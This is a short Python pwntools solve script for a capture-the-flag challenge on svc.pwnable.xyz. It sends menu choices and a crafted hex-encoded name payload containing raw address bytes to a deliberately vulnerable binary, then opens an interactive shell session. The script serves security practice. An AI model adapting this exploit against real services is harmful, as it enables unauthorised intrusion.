#!/usr/bin/env python
# -*- coding: utf-8 -*-
from __future__ import print_function
from pwn import *

binary = './challenge'
elf = ELF(binary)
libc = elf.libc

# io = process(binary, aslr = 0)
io = remote('svc.pwnable.xyz', 30031)
context.log_level = 'debug'
context.arch = elf.arch
context.terminal = ['tmux', 'splitw', '-h']

myu64 = lambda x: u64(x.ljust(8, '\0'))
ub_offset = 0x3c4b30
codebase = 0x555555554000

name = '4469645f796f755f7265616c6c795f6d6973735f7468655fc8545f627f4484f3'.decode('hex')

io.recvuntil("> ")
io.sendline('1')

io.recvuntil(': ')

io.sendline(name)
io.recvuntil("> ")
io.sendline('4')




io.interactive()
